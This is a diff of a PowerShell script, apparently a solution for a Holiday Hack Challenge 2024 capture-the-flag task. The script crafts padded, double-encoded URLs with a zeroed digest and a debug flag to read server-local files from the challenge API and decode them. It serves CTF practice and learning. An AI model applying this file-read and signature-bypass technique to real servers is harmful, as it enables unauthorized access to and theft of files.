@@ -2,7 +2,7 @@
     .SYNOPSIS
 
         Holiday Hack Challenge 2024 - Snow-maggedon
-        
+
         Decrypt the Naughty-Nice List
         Difficulty: 5 of 5
 
@@ -26,7 +26,7 @@
         Required Bot UUID, this is unique to each player and set of generated artifacts.
         You can find this UUID in both the frostbit_core_dump file strings as well as the
         pcap file provided you have decrypted the TLS HTTP traffic stream.
-        
+
         The BotUUID will have this format of hex chars and dashes (example only):
         f14d60cd-67b9-44ec-8f41-b5ea5137413c
 
@@ -75,7 +75,7 @@ function Is-UUID {
     param (
         [string]$InputString
     )
-    
+
     $uuidRegex = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$'
     return $InputString -match $uuidRegex
 }
@@ -130,28 +130,28 @@ $found = $false
 
     # base url
     $url = "https://api.frostbit.app/view/"
-    
+
     $Padding = 'X' * $_
-    
+
     $url += $Padding
-    
+
     # double encoded nonce.
     $url += $DoubleNonceEncoded
-    
+
     # api server local file to attempt reading.
     $url += Escape-StringForURL -inputString $FileToExfiltrate
-    
+
     # botuuid, with all-zeros digest and debug set.
     $url += "/$BotUUID/status?digest=00000000000000000000000000000000&debug=true"
-    
+
     # send the url and grab the response content
     $resp = Invoke-WebRequest -SkipHttpErrorCheck -Uri $url
-    
+
     if($resp.StatusCode -eq 200){
         $found = $true
         "URI: " + $url
         $debugDataB64 = $($resp.Content | select-string -pattern "debugData = `"(.*)`"" | %{ $_.Matches[0].Groups[1].Value })
-        
+
         $exfil = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($debugDataB64))
         $filelen = ($exfil | Format-Hex).Bytes.Length
         "Status code:      " + $resp.StatusCode
@@ -169,8 +169,8 @@ $found = $false
 }
 
 if($found -eq $false){
-    "URI: " + $url
-    "Status code:         " + $resp.StatusCode + " " + $resp.StatusDescription
+    "Last URI attempted:  " + $url
+    "Last status code:    " + $resp.StatusCode + " " + $resp.StatusDescription
     "File not found:      " + $FileToExfiltrate
     $resp.Content
 }
